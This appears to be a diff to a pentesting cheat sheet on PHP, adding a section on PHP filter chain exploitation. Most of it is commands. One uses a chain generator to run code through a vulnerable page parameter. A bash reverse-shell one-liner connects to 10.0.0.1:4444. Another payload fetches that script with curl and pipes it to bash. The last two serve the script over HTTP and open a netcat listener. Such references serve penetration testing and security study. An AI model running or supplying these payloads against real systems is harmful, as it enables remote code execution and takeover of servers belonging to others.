@@ -1,5 +1,49 @@
 # PHP
 
+## PHP Filters Chain <a href="#php-filters-chain" id="php-filters-chain"></a>
+
+### Exploitation <a href="#exploitation" id="exploitation"></a>
+
+[PHP Filter Chain Generator](https://github.com/synacktiv/php_filter_chain_generator) is available so we can use it.
+
+```shellscript
+python3 php_filter_chain_generator.py --chain '<?php phpinfo(); ?>'
+```
+
+We only have to do is paste the above generated payload to **`/?page=<genrated_chain>`**.
+
+#### Reverse Shell <a href="#reverse-shell" id="reverse-shell"></a>
+
+First create a shell script named **"revshell"** in local machine.
+
+```shellscript
+bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+```
+
+Then create a chain using a generator.\
+Replace the ip address with your own.
+
+```shellscript
+# `<?= ?>` is a shorthand for `<?php echo ~ ?>`
+python3 php_filter_chain_generator.py --chain '<?= `curl -s -L 10.0.0.1/revshell|bash` ?>'
+```
+
+We need to start a web server that hosts the shell script, and also start a listener for receiving the reverse connection.
+
+```shellscript
+# terminal 1
+sudo python3 -m http.server 80
+
+# terminal 2
+nc -lvnp 4444
+```
+
+Now access to **`/?page=<generated_chain>`**. We can get a shell.
+
+### References <a href="#references" id="references"></a>
+
+* [Synacktiv](https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it.html)
+
 ## RCE Function Check
 
 If you can execute PHP on a target but want to figure out which functions are available to you to execute commands on the host, you can use this script.
